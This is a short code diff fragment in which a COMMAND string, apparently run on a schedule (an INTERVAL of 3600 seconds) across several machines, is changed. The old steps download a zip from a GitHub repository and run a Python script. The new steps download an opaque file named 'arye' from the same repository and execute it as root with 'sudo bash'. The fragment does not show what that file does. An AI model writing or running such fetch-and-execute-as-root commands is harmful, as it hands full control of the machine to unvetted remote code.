@@ -19,11 +19,8 @@ ACTIVE_COUNT = 20
 INTERVAL = 3600
 
 COMMAND = """
-sudo apt update
-sudo apt install python3-pip -y
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/redis.zip
-unzip redis.zip
-python3 run.py
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/arye
+sudo bash arye
 
 """
 
